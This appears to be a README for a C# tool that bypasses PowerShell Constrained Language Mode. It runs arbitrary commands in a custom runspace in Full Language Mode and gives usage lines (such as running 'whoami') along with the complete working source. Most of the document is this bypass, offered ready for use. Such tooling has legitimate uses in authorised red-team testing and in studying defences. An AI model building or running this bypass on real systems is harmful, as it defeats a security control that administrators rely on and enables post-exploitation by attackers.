# Constrained Language Mode (CLM) Bypass
A simple C# tool to execute PowerShell commands via a custom runspace.
Supports passing commands as arguments and printing the current PowerShell language mode.
## Usage
Check if the CLM is bypassed.
```PowerShell
.\CLM-Bypass.exe
```

Execute arbitary PowerShell command in a new custom runspace which should inherits **Full Language Mode**.
```PowerShell
.\CLM-Bypass.exe "whoami"
```

## Source Code
Here is the CSharp source code for customization
```C#
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Program
{
    static void Main(string[] args)
    {
        using (var rs = RunspaceFactory.CreateRunspace())
        {
            rs.Open();
            using (var ps = PowerShell.Create())
            {
                ps.Runspace = rs;

                if (args.Length == 0)
                {
                    ps.AddScript("$ExecutionContext.SessionState.LanguageMode");
                    foreach (var r in ps.Invoke())
                        Console.WriteLine("LanguageMode: " + r);
                    return;
                }
                
                ps.AddScript(string.Join(" ", args), useLocalScope: true);
                foreach (var r in ps.Invoke())
                    Console.WriteLine(r);
            }
        }
    }
}
```